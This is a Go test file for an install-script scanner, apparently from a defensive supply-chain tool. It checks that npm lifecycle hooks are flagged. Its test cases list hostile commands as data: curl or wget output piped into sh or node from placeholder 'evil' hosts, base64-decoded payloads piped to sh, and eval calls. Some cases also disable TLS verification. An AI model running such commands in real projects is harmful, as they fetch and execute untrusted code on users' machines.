package hooks

import (
	"testing"

	"github.com/mtclinton/defensive-suite/instguard/internal/report"
)

func TestScanScriptPatterns(t *testing.T) {
	tests := []struct {
		name     string
		body     string
		wantHit  bool
		wantSev  report.Severity
		contains string
	}{
		{"curl pipe sh", "curl -s https://evil.sh | sh", true, report.SeverityCritical, "piped"},
		{"wget pipe bash", "wget -qO- http://x | bash", true, report.SeverityCritical, "piped"},
		{"curl pipe node", "curl https://x | node", true, report.SeverityCritical, "piped"},
		{"node -e", "node -e \"require('child_process').exec('id')\"", true, report.SeverityHigh, "node -e"},
		{"eval call", "eval(decode(payload))", true, report.SeverityHigh, "eval("},
		{"atob", "node -e \"eval(atob('ZWNobyBo'))\"", true, report.SeverityHigh, "node -e"},
		{"base64 -d pipe", "echo Zm9v | base64 -d | sh", true, report.SeverityCritical, "piped"},
		{"base64 --decode", "base64 --decode payload.b64 > x", true, report.SeverityHigh, "base64"},
		{"tls disabled", "NODE_TLS_REJECT_UNAUTHORIZED=0 node fetch.js", true, report.SeverityHigh, "TLS"},
		{"tls disabled quoted", "export NODE_TLS_REJECT_UNAUTHORIZED='0'", true, report.SeverityHigh, "TLS"},
		{"benign", "tsc -p . && node dist/index.js", false, 0, ""},
		{"benign echo", "echo build complete", false, 0, ""},
		{"empty", "", false, 0, ""},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := ScanScript("postinstall", tc.body)
			if tc.wantHit && len(f) == 0 {
				t.Fatalf("expected a finding for %q", tc.body)
			}
			if !tc.wantHit && len(f) != 0 {
				t.Fatalf("expected no finding for %q, got %+v", tc.body, f)
			}
			if tc.wantHit {
				hitSev := false
				for _, x := range f {
					if x.Severity == tc.wantSev {
						hitSev = true
					}
				}
				if !hitSev {
					t.Errorf("severity %v not among findings %+v", tc.wantSev, f)
				}
			}
		})
	}
}

func TestScanScriptsOnlyInstallLifecycle(t *testing.T) {
	scripts := map[string]string{
		"postinstall": "curl https://evil | sh",
		"test":        "curl https://also-evil | sh", // NOT an install hook — must be ignored
		"build":       "tsc",
	}
	f := ScanScripts("pkg", scripts)
	if len(f) != 1 {
		t.Fatalf("only postinstall should be scanned, got %d: %+v", len(f), f)
	}
	if f[0].Package != "pkg" {
		t.Errorf("finding not tagged with package: %+v", f[0])
	}
}

func TestScanScriptsAllLifecycleNames(t *testing.T) {
	for _, name := range []string{"preinstall", "install", "postinstall", "prepare"} {
		f := ScanScripts("p", map[string]string{name: "eval(x)"})
		if len(f) == 0 {
			t.Errorf("lifecycle script %q not scanned", name)
		}
	}
}

func TestInstallScriptNames(t *testing.T) {
	got := InstallScriptNames(map[string]string{
		"preinstall": "x", "postinstall": "y", "test": "z", "build": "b",
	})
	if len(got) != 2 || got[0] != "postinstall" || got[1] != "preinstall" {
		t.Errorf("install script names=%v (want sorted postinstall,preinstall)", got)
	}
}

func TestOneLineTruncates(t *testing.T) {
	long := ""
	for i := 0; i < 400; i++ {
		long += "a"
	}
	out := oneLine(long)
	if len([]rune(out)) > 302 {
		t.Errorf("oneLine did not truncate: len=%d", len([]rune(out)))
	}
}
